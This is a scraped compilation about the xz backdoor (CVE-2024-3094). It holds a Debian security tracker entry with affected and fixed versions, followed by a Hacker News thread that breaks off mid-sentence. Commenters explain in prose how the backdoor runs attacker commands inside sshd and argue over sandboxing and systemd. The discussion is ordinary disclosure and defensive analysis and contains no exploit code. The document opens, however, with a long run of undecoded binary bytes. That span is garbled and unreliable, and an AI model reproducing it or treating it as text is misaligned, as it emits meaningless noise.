�Y|��E��ݼGm��<���9h�L�ɈVng�'j�eDcs�<�q���H<�Ż�/�
�d�������`��&T]�=b\_�3�k\_DV��>�Y��[ <��)�v�C���K��'.\*��o���q5w�]���Q\*F�F](��O��/��og>$V���~�p�-���������K�c����ܵ��r��{��7��%G���}+�~�^��6{��o\_�������\_���\_�毼��ݷ����r�}x��D��d��!z���.�yaن'ttt7m����(Һ�(h��k�6Ľ胠]�/b��o��S{ߚ��LǬM�{����{���d���6
����d�,�;z��l��N��0ζ0�cȺ���g�:��v�6�c�D��:r�������n�Vm� Φ��5�!�ILW�H\_�D熱
�I���p�g��&6\*�&q�g�#�m
�a
!�Lëi�D�6��\S �e��4�a&�
���ܳT�&�#��j�4��>t�M[�M�7�d��j�l��q>��
9i�A�
�Ә����=��B�[$�X�6ݢb�;�t��{�Ed�n�2I��tm�"��
��(�J� f�\*��$���
���G}p�����۴�.����iѧ;�Υi�k:�3L�y�E��h=��1.�%�gM�U��)��|�R�x�\�����h��K�
+�IB��Xl,G)���yt��0�qI�q�2r1Þ��H��:�'��L���<�1Cܴ�W]�&q>��X���kKT4߳8k��xT����֔�9M���)s� ���M�z����l���S����iV�s�2���M��7~��L�oM3��A�?O3 ר5�A)�9b��|��Θ��0R���M}�jS"��lG0���c�+�4N���r����ۘ�{��9�S ��:{�\��Y��\_L��g.LLx����1�w�u& g�m�����z����P�& �P[�b����H3��ͧ,1�Z��� fŊϷ�F3�����S&4�75�Fv��hZ�g0i���'�?c9��r�o�����&�ӥ��N1GB����W���t{��i\TɊpr3�{��+Ԧ1������&?�k�y�u^����B�����+�:���?���������O>��18RЭτK���2�Qf�o,�vm-�ҩ�뎸�?�e�5���� G�����廯�8����}D���l�N-�S @~��O�Lh��x�7���%٫Uek��y�)y%��9�݄�0�v��͆9'�S�v$��;����ng����������rh����&[o �\�SG��s|+��U�f���v)4o
�� !����as�&��h��x�.����a�X),��^�T�n�$HL�
 ,%1��)`IbX��IX Rz]\_�
�K=�1!��J
� �Rj��(�ij����m�w�b
��4�`)��h���#
�\*&Ä^��/ j�D�� �腢��0� ��i׵��s�޸ �t�P �[�dI��<L2r^��%��J�I\*v"/^��h8Yu��x}�Re�b���+�w�<W�Mv{A�d�{�U��͚��V��S�ؘ�,흩�kK
i[��h�� Z�&�q����3�׮�(�2�G�����r���u�ˑ$����x?3�Y�บouXM�g�|FQTxL��,id���&������F�N�~����^�:R�Ϫç����s��������4-�`0�P��%�rQ��(�FrHh�0��JZL\HMRhʂ�r,�h}x�S �c3`��c���Zr/;���Z�7c���aݒk�Sn\*�z5}\H�k'
���ږ �!� ![D����r��T&Q���(jy��\*TQ&]���/ܮ<�h25���r`
fc�w]��)�W9TB��SYD-�3�BŞV�����:�|�Dmஃ{�\_�k

=== Content from security-tracker.debian.org_cf44fe03_20250111_034036.html ===

# CVE-2024-3094

| **Name** | CVE-2024-3094 |
| --- | --- |
| **Description** | Malicious code was discovered in the upstream tarballs of xz, starting with version 5.6.0. Through a series of complex obfuscations, the liblzma build process extracts a prebuilt object file from a disguised test file existing in the source code, which is then used to modify specific functions in the liblzma code. This results in a modified liblzma library that can be used by any software linked against this library, intercepting and modifying the data interaction with this library. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2024-3094) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-3094); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2024-3094), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2024-3094), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2024-3094), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2024-3094), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2024-3094), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2024-3094), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2024-3094), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2024-3094)/[CVE](https://www.suse.com/security/cve/CVE-2024-3094/), GitHub [advisories](https://github.com/advisories?query=CVE-2024-3094)/[code](https://github.com/search?type=Code&q=%22CVE-2024-3094%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2024-3094%22), [web search](https://duckduckgo.com/html?q=%22CVE-2024-3094%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **References** | [DSA-5649-1](/tracker/DSA-5649-1) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [xz-utils](/tracker/source-package/xz-utils) ([PTS](https://tracker.debian.org/pkg/xz-utils)) | bullseye (security), bullseye | 5.2.5-2.1~deb11u1 | fixed |
|  | bookworm | 5.4.1-0.2 | fixed |
|  | sid, trixie | 5.6.3-1 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [xz-utils](/tracker/source-package/xz-utils) | source | buster | (not affected) |  |  |  |
| [xz-utils](/tracker/source-package/xz-utils) | source | bullseye | (not affected) |  |  |  |
| [xz-utils](/tracker/source-package/xz-utils) | source | bookworm | (not affected) |  |  |  |
| [xz-utils](/tracker/source-package/xz-utils) | source | (unstable) | 5.6.1+really5.4.5-1 |  |  |  |

## Notes

```
[bookworm] - xz-utils <not-affected> (Vulnerable code not present)
[bullseye] - xz-utils <not-affected> (Vulnerable code not present)
[buster] - xz-utils <not-affected> (Vulnerable code not present)
<https://www.openwall.com/lists/oss-security/2024/03/29/4>
<https://tukaani.org/xz-backdoor/>
<https://boehs.org/node/everything-i-know-about-the-xz-backdoor>
<https://rya.nc/xz-valid-n.html>
<https://lwn.net/Articles/967192/>
<https://securelist.com/xz-backdoor-story-part-1/112354/>
<https://securelist.com/xz-backdoor-story-part-2-social-engineering/112476/>
<https://securelist.com/xz-backdoor-part-3-hooking-ssh/113007/>

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from news.ycombinator.com_4fb65626_20250111_034032.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D39877267) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [XZ backdoor: "It's RCE, not auth bypass, and gated/unreplayable."](https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b) ([bsky.app](from?site=bsky.app)) | | --- | --- | --- | |  | | 1323 points by [junon](user?id=junon) [9 months ago](item?id=39877267)  | [hide](hide?id=39877267&goto=item%3Fid%3D39877267) | [past](https://hn.algolia.com/?query=XZ%20backdoor%3A%20%22It%27s%20RCE%2C%20not%20auth%20bypass%2C%20and%20gated%2Funreplayable.%22&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=39877267&auth=a3205dcb956a15375bda3f7809117a5b36048cbd) | [810 comments](item?id=39877267) |  | |  |  | [junon](user?id=junon) [9 months ago](item?id=39877312)   | [next](#39878872) [–]  EDIT: Here's some more RE work on the matter. Has some symbol remapping information that was extracted from the prefix trie the backdoor used to hide strings. Looks like it tried to hide itself even from RE/analysis, too. [https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9...](https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504) Full list of decoded strings here: <https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01> -- For someone unfamiliar with openssl's internals (like me): The N value, I presume, is pulled from the `n` field of `rsa\_st`: [https://github.com/openssl/openssl/blob/56e63f570bd5a479439b...](https://github.com/openssl/openssl/blob/56e63f570bd5a479439bc6f6a2499f6b86ded341/crypto/rsa/rsa_local.h#L62C5-L62C12) Which is a `BIGNUM`: [https://github.com/openssl/openssl/blob/56e63f570bd5a479439b...](https://github.com/openssl/openssl/blob/56e63f570bd5a479439bc6f6a2499f6b86ded341/crypto/bn/bn_local.h#L245) Which appears to be a variable length type. The back door pulls this from the certificate received from a remote attacker, attempts to decrypt it with ChaCha20, and if it decrypts successfully, passed to `system()`, which is essentially a simple wrapper that executes a line of shellscript under whichever user the process is currently executing. If I'm understanding things correctly, this is worse than a public key bypass (which myself and I think a number of others presumed it might be) - a public key bypass would, in theory, only allow you access as the user you're logging in with. Assumedly, hardened SSH configurations would disallow root access. However, since this is an RCE in the context of e.g. an sshd process itself, this means that sshd running as root would allow the payload to itself run as root. Wild. This is about as bad as a widespread RCE can realistically get. | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [jeroenhd](user?id=jeroenhd) [9 months ago](item?id=39877773)   | [parent](#39877312) | [next](#39879674) [–]  > However, since this is an RCE in the context of e.g. an sshd process itself, this means that sshd running as root would allow the payload to itself run as root. With the right sandboxing techniques, SELinux and mitigations could prevent the attacker from doing anything with root permissions. However, applying a sandbox to an SSH daemon effectively is very difficult. | | --- | --- | --- | | | |  |  | [semiquaver](user?id=semiquaver) [9 months ago](item?id=39878918)   | [root](#39877312) | [parent](#39877773) | [next](#39878184) [–]  Could you explain how SELinux could *ever* sandbox against RCE in sshd? Its purpose is to grant login shells to arbitrary users, after all. | | --- | --- | --- | | | |  |  | [saltcured](user?id=saltcured) [9 months ago](item?id=39879358)   | [root](#39877312) | [parent](#39878918) | [next](#39879420) [–]  You could refactor sshd so most network payload processing is delegated to sandboxed sub-processes. Then an RCE there has less capabilities to exploit directly. But, I think you would have to assume an RCE can cause the sub-process to produce wrong answers. So if the answers are authorization decisions, you can transitively turn those wrong answers into RCE in the normal login or remote command execution context. But, the normal login or remote command execution is at least audited. And it might have other enforcement of which accounts or programs are permitted. A configuration disallowing root could not be bypassed by the sub-process. You could also decide to run all user logins/commands under some more confined SE-Linux process context. Then, the actual user sessions would be sandboxed compared to the real local root user. Of course, going too far with this may interfere with the desired use cases for SSH. | | --- | --- | --- | | | |  |  | [nrdvana](user?id=nrdvana) [9 months ago](item?id=39881177)   | [root](#39877312) | [parent](#39879358) | [next](#39879480) [–]  That just raises the hurdle for the attacker. The attacker in this case has full control to replace any function within ssh with their own version, and the master process of sshd will always need the ability to fork and still be root on the child process before dropping privileges. I don't see any way around that. They only needed to override one function this time, but if you raise the bar they would just override more functions and still succeed. | | --- | --- | --- | | | |  |  | [tomasGiden](user?id=tomasGiden) [9 months ago](item?id=39882294)   | [root](#39877312) | [parent](#39881177) | [next](#39881728) [–]  I’m highly safety critical systems you have software (and hardware) diversity were multiple pieces of software, developed independently, have to vote on the result. Maybe highly critical pieces of Linux like the login process should be designed the same way. So that two binaries without common dependencies would need to accept the login for the user to get privileges. Exactly how to do it (especially transparently for the user), I have no idea though. Maybe sending ssh login requests to two different sshd implementations and if they don’t do the same things (same system calls), they are both killed. Or some kind of two step login process where the first login only gives access to the sandbox of the second login process. But in general I assume the Linux attack surface is too big to do software diversity for all of it. | | --- | --- | --- | | | |  |  | [rigid](user?id=rigid) [9 months ago](item?id=39882507)   | [root](#39877312) | [parent](#39882294) | [next](#39887754) [–]  > login process RCE doesn't really follow a login process design. As soon as you got RCE you can be considered pwned. If not now, then at the time the next locally exploitable vulnerability comes up. There are plenty. | | --- | --- | --- | | | |  |  | [nrdvana](user?id=nrdvana) [9 months ago](item?id=39887754)   | [root](#39877312) | [parent](#39882294) | [prev](#39882507) | [next](#39881728) [–]  Or better, just make an ssh without *any* dependencies. Statically compile it, and get rid of the libssl and libsystemd and even libpam and libc's nsswitch. (I actually do this for some of my systems) | | --- | --- | --- | | | |  |  | [lovasoa](user?id=lovasoa) [9 months ago](item?id=39881728)   | [root](#39877312) | [parent](#39881177) | [prev](#39882294) | [next](#39879480) [–]  > The attacker in this case has full control to replace any function within ssh with their own version Not true. They have this ability only for binaries that are linked to liblzma. If sshd were to be decomposed into multiple processes, not all of them would (hopefully) depend on all the libraries that the original sshd depended on. | | --- | --- | --- | | | |  |  | [nrdvana](user?id=nrdvana) [9 months ago](item?id=39887707)   | [root](#39877312) | [parent](#39881728) | [next](#39879480) [–]  Well, sshd doesn't depend on liblzma in the first place, but Debian and RedHat thought it would be a good idea to tie it into libsystemd for logging purposes, and patched in support. It's still pretty bad to have systemd compromised, even if ssh weren't, though. Maybe the army of pitchforks should be marching on the systemd camp. It's definitely not OpenBSD's choice of architecture, here. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39879480)   | [root](#39877312) | [parent](#39879358) | [prev](#39881177) | [next](#39879420) [–]  I thought that OpenSSH's sshd already separates itself into a privileged process and a low-privilege process. I don't know any details about that. Here's what Google showed me for that: [https://github.com/openssh/openssh-portable/blob/master/READ...](https://github.com/openssh/openssh-portable/blob/master/README.privsep) | | --- | --- | --- | | | |  |  | [treasy](user?id=treasy) [9 months ago](item?id=39879523)   | [root](#39877312) | [parent](#39879480) | [next](#39879420) [–]  If you look at the diagram of privsep, the authentication process is part of the privileged binary, which is where this RCE lives <http://www.citi.umich.edu/u/provos/ssh/priv.jpg> | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39879931)   | [root](#39877312) | [parent](#39879523) | [next](#39879420) [–]  The signature validation could be moved into an unprivileged process forked from that one. | | --- | --- | --- | | | |  |  | [mjg59](user?id=mjg59) [9 months ago](item?id=39880541)   | [root](#39877312) | [parent](#39879931) | [next](#39880256) [–]  It wouldn't matter in this case, since the exploit could simply rewrite the function that calls out to the unprivileged process. If you already have malicious code in your privileged parent process there's no way to recover from that. | | --- | --- | --- | | | |  |  | [CanaryLayout](user?id=CanaryLayout) [9 months ago](item?id=39880990)   | [root](#39877312) | [parent](#39880541) | [next](#39880256) [–]  Exactly. The attack came in by hitching a ride on to systemd. sshd is not the problem. the ldd/monolith architecture surrounding systemd is. What if I duplicated this attack but instead targeted dbus or any other thing that systemd is managing? | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39881524)   | [root](#39877312) | [parent](#39880990) | [next](#39880256) [–]  No, the problem is that someone had access to backdoor code that runs in a privileged process. | | --- | --- | --- | | | |  |  | [eto-san](user?id=eto-san) [9 months ago](item?id=39889169)   | [root](#39877312) | [parent](#39881524) | [next](#39880256) [–]  Tell us all, please, how the starting vector of this attack would affect statically compiled dropbear binary even with systemd's libsystemd pwnage? I am very cruious about your reasoning. The fact, that the whole reason this library is even being pulled into the sshd daemon process, is some stupid stuff like readiness notification, which itself is utterly broken on systemd, by design (and thus is forever unfixable), and makes this even more tragic. Don't put your head into the sand, just because of the controversial nature of the topic. Systemd was VERY accommodating in this whole fiasco. Saddest part of all this is, that we know how to to do better. At least since Bernstein, OpenBSD and supervision community (runit/s6) guys solved it. Yet somehow we see same mistakes repeated again and again. If you want to read about notification shenanigans and systemd's dubious (at best) decisions and implementation quality, read here: [https://jdebp.uk/FGA/unix-daemon-readiness-protocol-problems...](https://jdebp.uk/FGA/unix-daemon-readiness-protocol-problems.html) I believe this is how you do readiness notification properly: <http://skarnet.org/software/s6/notifywhenup.html> I.e. you fork and run little helper to write, or directly write a single byte(!), to notify supervisor over supervisor provided fd. It allows you to even privseparate your notifier stuff or do all the cute SELinux magic you need. But that would be too simple, I guess, so instead we link like 10 completely unrelated libraries into sshd, liblzma being one of them, one of the most crucial processes on the machine. To notify supervisor that it's ready. Sounds about right, linux distros (and very specific ones at that). Sshd should be sacred, nothing more than libc and some base cryptolibs (I don't remember whether it still needs <any>ssl even) it needs. Another great spot to break sshd is PAM, which has no place doing there either. Unfortunately it's hard dep. on most linux distros. Maybe sshd should adopt kernel taint approach: as soon as any weird libraries (ie everything not libc and cryptolibs) are detected in sshd proces it should consider itself tainted. Maybe even seppuku itself. The exploit could be, probably, somehow doable without systemd. But it would be much, much harder though. Don't try to obfuscate that very fact from the discussion. | | --- | --- | --- | | | |  |  | [mjg59](user?id=mjg59) [9 months ago](item?id=39891773)   | [root](#39877312) | [parent](#39889169) | [next](#39880256) [–]  The sd-notify protocol is literally "Read socket address from environment variable, write a value to that socket". There's no need to link in libsystemd to achieve this. It's unreasonable to blame systemd for projects that choose to do so. And, in fact, upstream systemd has already changed the behaviour of libsystemd so it only dlopen()s dependencies if the consumer actually calls the relevant entry points - which would render this attack irrelevant. > Another great spot to break sshd is PAM, which has no place doing there either. Unfortunately it's hard dep. on most linux distros. There are many things to hate about PAM (it should clearly be a system daemon with all of the modules running out of process), but there's literally no universe where you get to claim that sshd should have nothing to do with PAM - unless you want to plug every single possible authentication mechanism into sshd upstream you're going to end up with something functionally identical. | | --- | --- | --- | | | |  |  | [littlestymaar](user?id=littlestymaar) [9 months ago](item?id=39880256)   | [root](#39877312) | [parent](#39879931) | [prev](#39880541) | [next](#39879420) [–]  That's an easy thing to say after the fact indeed but yes. In fact after such a disastrous backdoor I wouldn't be surprised if OpenSSH moved all code calling external libraries to unprivileged processes to make sure such an attack can never have such a dramatic effect (an auth bypass would still likely be possible, but that's still way better than a root RCE…). At this point “All libraries could be malicious” is a threat model that must be considered for something as security critical as OpenSSH. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39880836)   | [root](#39877312) | [parent](#39880256) | [next](#39884617) [–]  I don't think that's a threat model that OpenSSH should waste too much time on. Ultimately this is malicious code in the build machine compiling a critical system library. That's not reasonable to defend against. Keep in mind that upstream didn't even link to liblzma. Debian patched it to do so. OpenSSH should defend against that too? | | --- | --- | --- | | | |  |  | [CanaryLayout](user?id=CanaryLayout) [9 months ago](item?id=39881000)   | [root](#39877312) | [parent](#39880836) | [next](#39881587) [–]  any one of us if we sat on the OSSH team would flip the middle finger. What code is the project supposed to write when nothing on main dyn loaded liblzma. It was brought in from a patch they don't have realistic control over. This is a Linux problem, and the problem is systemd, which is who brought the lib into memory and init'd it. | | --- | --- | --- | | | |  |  | [shzhdbi09gv8ioi](user?id=shzhdbi09gv8ioi) [9 months ago](item?id=39882767)   | [root](#39877312) | [parent](#39881000) | [next](#39884671) [–]  > This is a Linux problem, and the problem is systemd, which is who brought the lib into memory and init'd it. Not at all, it is a distro issue because a few distros such as Debian chose to patch openssh to bring in systemd support [1]. Other systemd-based distros like Arch Linux remains unaffected because they don't carry this patch. 1: [https://sources.debian.org/src/openssh/1%3A9.7p1-2/debian/pa...](https://sources.debian.org/src/openssh/1%3A9.7p1-2/debian/patches/systemd-readiness.patch/) | | --- | --- | --- | | | |  |  | [bbarnett](user?id=bbarnett) [9 months ago](item?id=39886359)   | [root](#39877312) | [parent](#39882767) | [next](#39884671) [–]  Yet Redhat and others applied this patch, as systemd is so incapable of reliably launching processes, that it kept killing sshd without it. What a complete failure of an init system's job, and the patch was applied due to systemd not resolving the issue in another way. This is the problem with systemd. Way, way way too much complexity. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39887954)   | [root](#39877312) | [parent](#39886359) | [next](#39887501) [–]  I think the criticisms of systemd are valid but also tangential. I think Poettering himself is on one of the HN threads saying they didn't need to link to his library to accomplish what they sought to do. Lzma is also linked into a bunch of other critical stuff, including but not limited to distro package managers and the kernel itself, so if they didn't have sshd to compromise, they could have chosen another target. | | --- | --- | --- | | | |  |  | [bbarnett](user?id=bbarnett) [9 months ago](item?id=39887997)   | [root](#39877312) | [parent](#39887954) | [next](#39887501) [–]  And yet: <https://news.ycombinator.com/item?id=39878181> So no, as Pottering claimed, sshd would not be hit by this bug except for this systemd integration. I really don't care about "Oh, someone could have written another compromise!". What allowed for *this* compromise, was a direct inability for systemd to reliable do its job as an init system, necessitating a patch. And Redhat, Fedora, Debian, Ubuntu, and *endless other distros* took this route, because something was required, and here we are. Something that *would not be required* if systemd could actually perform its job as an init system without endless work arounds. Also see my other reply in this thread, re Redhat's patch. | | --- | --- | --- | | | |  |  | [nrdvana](user?id=nrdvana) [9 months ago](item?id=39891170)   | [root](#39877312) | [parent](#39887997) | [next](#39888138) [–]  I just went and read <https://bugzilla.redhat.com/show_bug.cgi?id=1381997> and actually seems to me that sshd behavior is wrong, here. I agree with the S6 school of thought, i.e. that PID files are an abomination and that there should always be a chain of supervision. systemd is capable of doing that just fine. The described sshd behavior (re-execing in the existing daemon and then forking) can only work on a dumb init system that doesn't track child processes. PID files are *always* a race condition and should never be part of any service detection. That said, there are dozens of ways to fix this and it really seems like RedHat chose the worst one. They could have patched sshd in the other various ways listed in that ticket, or even just patch it to exit on SIGHUP and let systemd re-launch it. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39888138)   | [root](#39877312) | [parent](#39887997) | [prev](#39891170) | [next](#39887501) [–]  I'm not the type to go out of my way to defend systemd and their design choices. I'm just saying the severity of this scenario of a tainted library transcends some of the legit design criticisms. If you can trojan liblzma you can probably do some serious damage without systemd or sshd. | | --- | --- | --- | | | |  |  | [bbarnett](user?id=bbarnett) [9 months ago](item?id=39888176)   | [root](#39877312) | [parent](#39888138) | [next](#39887501) [–]  Of course you can trojan other ways, but that can only be said, in this thread, in defense of systemd. After all, what you're saying is and has always been the case! It's like saying "Well, Ford had a design flaw in this Pinto, and sure 20 people died, but... like, cars have design flaws from time to time, so an accident like this would've happened eventually anyhow! Oh well!" It doesn't jive in this context. Directly speaking to this point, patched ssh was chosen *for a reason*. It was the lowest hanging fruit, with the greatest reward. Your speculation about other targets isn't unwarranted, but at the same time, entirely unvalidated. | | --- | --- | --- | | | |  |  | [streb-lo](user?id=streb-lo) [9 months ago](item?id=39887501)   | [root](#39877312) | [parent](#39886359) | [prev](#39887954) | [next](#39884671) [–]  systemd is just fine on Arch without this patch. It's not a systemd issue, it's a larger cultural issue with packagers increasing attack surface to make their lives easier. | | --- | --- | --- | | | |  |  | [bbarnett](user?id=bbarnett) [9 months ago](item?id=39887875)   | [root](#39877312) | [parent](#39887501) | [next](#39884671) [–]  It absolutely, positively, 100% was added due to issues with systemd. Both Redhat and Debian and *others* applied this patch as a result. People didn't do it "just cause". <https://bugzilla.redhat.com/show_bug.cgi?id=1381997> *Jakub Jelen 2016-10-12 08:40:44 UTC <snip> > Why do you want to avoid sd\_notify()? Why to avoid this? Well, it is adding more systemd-specific bits and new build dependency to something that always worked well under other inits without any problems for years.* | | --- | --- | --- | | | |  |  | [streb-lo](user?id=streb-lo) [9 months ago](item?id=39890423)   | [root](#39877312) | [parent](#39887875) | [next](#39884671) [–]  They chose the worst solution to a problem that had multiple better solutions because of a pre-existing patch was the easiest path forward. That’s exactly what I’m talking about. | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39884671)   | [root](#39877312) | [parent](#39881000) | [prev](#39882767) | [next](#39881587) [–]  Brought in from a patch they rejected to accept because of this exact risk | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39881587)   | [root](#39877312) | [parent](#39880836) | [prev](#39881000) | [next](#39884617) [–]  It is possible to prevent libraries from patching functions in other libraries; make those VM regions unwritable, don't let anyone make them writable, and adopt PAC or similar hardware protection so the kernel can't overwrite them either. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39882788)   | [root](#39877312) | [parent](#39881587) | [next](#39882818) [–]  That's already done, but in this case the attack happened in a glibc ifunc and those run *before* the patching protection is enabled (since an ifunc has to patch the PLT). | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39887240)   | [root](#39877312) | [parent](#39882788) | [next](#39882818) [–]  Sounds like libraries should only get to patch themselves. (Some difficulty with this one though. For instance you probably have to ban running arbitrary code at load time, but you should do this anyway because it will stop people from writing C++.) | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39887643)   | [root](#39877312) | [parent](#39887240) | [next](#39882818) [–]  They're all in a single address space, there's nothing you can do to stop one part of a binary patching any other part. | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39887756)   | [root](#39877312) | [parent](#39887643) | [next](#39882818) [–]  I already said the way to do it in my previous comment. Don't let arbitrary code run before page permissions are locked down. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39887880)   | [root](#39877312) | [parent](#39887756) | [next](#39882818) [–]  If you're running in the binary you can call mprotect(2), and even if that is blocked you can cause all kinds of mischief. The original motivation for rings of protection on i286 was so that libraries could run in a different ring from the binary (usually library in ring 2 and program in ring 3), using a call gate (a very controlled type of call) to dispatch calls from the binary to the library, which stops the binary from modifying the library and IIRC libraries from touching each other. But x86-64 got rid of the middle rings. | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39888337)   | [root](#39877312) | [parent](#39887880) | [next](#39882818) [–]  > If you're running in the binary you can call mprotect(2) Darwin doesn't let you make library regions writable after dyld is finished with them. (Especially iOS where codesigning also prevents almost all other ways to get around this.) Something like OpenBSD pledge() can also revoke access to it in general. > But x86-64 got rid of the middle rings. x86 is a particularly insecure architecture but there's no need for things to be that way. That's why I mentioned PAC, which prevents other processes (including the kernel) from forging pointers even if they can write to another process's memory. | | --- | --- | --- | | | |  |  | [dotancohen](user?id=dotancohen) [9 months ago](item?id=39882818)   | [root](#39877312) | [parent](#39881587) | [prev](#39882788) | [next](#39884617) [–]  That does not sound like the type of machine that I want to work on. I still require a general purpose computer. | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39885858)   | [root](#39877312) | [parent](#39882818) | [next](#39884617) [–]  Why does a general purpose computer need to overwrite crypto functions in sshd? | | --- | --- | --- | | | |  |  | [salawat](user?id=salawat) [9 months ago](item?id=39887167)   | [root](#39877312) | [parent](#39885858) | [next](#39884617) [–]  Because it's a general purpose computer. Duh. The aim is to be able to arbitrary computations. Which overwriting crypto functions in sshd is a valid computation to be considered. | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39887238)   | [root](#39877312) | [parent](#39887167) | [next](#39884617) [–]  I don't think you should connect your general purpose computer to the internet then. Or keep any valuable data on it. Otherwise other people are going to get to perform computations on it. | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39884617)   | [root](#39877312) | [parent](#39880256) | [prev](#39880836) | [next](#39879420) [–]  Openssh has refused this patch that enables this in Debian multiple times as acrisk of preauth code execution as root. So maybe just don't patch sshd? | | --- | --- | --- | | | |  |  | [treasy](user?id=treasy) [9 months ago](item?id=39879420)   | [root](#39877312) | [parent](#39878918) | [prev](#39879358) | [next](#39879357) [–]  You can definitely prevent a lot of file/executable accesses via SELinux by running sshd in the default sshd\_t or even customizing your own sshd domain and preventing sshd from being able to run binaries in its own domain without a transition. What you cannot prevent though is certain things that sshd \_requires\_ to function like certain capabilities and networking access. by default sshd has access to all files in /home/$user/.ssh/, but that could be prevented by giving private keys a new unique file context, etc. SELinux would not prevent all attacks, but it can mitigate quite a few as part of a larger security posture | | --- | --- | --- | | | |  |  | [transpute](user?id=transpute) [9 months ago](item?id=39879590)   | [root](#39877312) | [parent](#39879420) | [next](#39879357) [–]  <https://news.ycombinator.com/item?id=39879559> *> Libselinux pulls in liblzma too* | | --- | --- | --- | | | |  |  | [treasy](user?id=treasy) [9 months ago](item?id=39879687)   | [root](#39877312) | [parent](#39879590) | [next](#39879357) [–]  libselinux is the userspace tooling for selinux, it is irrelevant to this specific discussion as the backdoor does not target selinux in any way, and sshd does not have the capabilities required to make use of the libselinux tooling anyway libselinux is just an unwitting vector to link liblzma with openssh | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [9 months ago](item?id=39879357)   | [root](#39877312) | [parent](#39878918) | [prev](#39879420) | [next](#39879278) [–]  Even though sshd must run as root (in the usual case), it doesn't need unfettered access to kernel memory, most of the filesystem, most other processes, etc. However, you could only really sandbox sshd-as-root. In order for sshd to do its job, it does need to be able to masquerade as arbitrary non-root users. That's still pretty bad but generally not "undetectably alter the operating system or firmware" bad. | | --- | --- | --- | | | |  |  | [sweetjuly](user?id=sweetjuly) [9 months ago](item?id=39879565)   | [root](#39877312) | [parent](#39879357) | [next](#39879278) [–]  >Even though sshd must run as root (in the usual case), it doesn't need unfettered access to kernel memory, most of the filesystem, most other processes, etc This is sort of overlooking the problem. While true, the processes spawned by sshd do need to be able to do all these things and so even if you did sandbox it, preserving functionality would all but guarantee an escape is trivial (...just spawn bash?). | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [9 months ago](item?id=39879599)   | [root](#39877312) | [parent](#39879565) | [next](#39879278) [–]  SELinux context is passed down to child processes. If sshd is running as confined root (system\_u:system\_r:sshd\_t or similar), then the bash spawned by RCE will be too. Even if sshd is allowed to masquerade as an unconfined non-root user, that user will (regardless of SELinux) be unable to read or write /dev/kmem, ignore standard file permissions, etc. | | --- | --- | --- | | | |  |  | [sweetjuly](user?id=sweetjuly) [9 months ago](item?id=39879932)   | [root](#39877312) | [parent](#39879599) | [next](#39879943) [–]  That's my point though--users expect to be able to do those things over ssh. Sandboxing sshd is hard because its child processes are expected to be able to do anything that an admin sitting at the console could do, up to and including reading/writing kernel memory. | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [9 months ago](item?id=39880178)   | [root](#39877312) | [parent](#39879932) | [next](#39879943) [–]  I'm assuming SSH root login is disabled and sudo requires separate authentication to elevate, but yeah, if there's a way to elevate yourself to unconfined root trivially after logging in, this doesn't buy you anything. Now, sandboxing sudo (in the general case) with SELinux probably isn't possible. | | --- | --- | --- | | | |  |  | [CanaryLayout](user?id=CanaryLayout) [9 months ago](item?id=39881086)   | [root](#39877312) | [parent](#39880178) | [next](#39879943) [–]  This does not matter either. The attack came 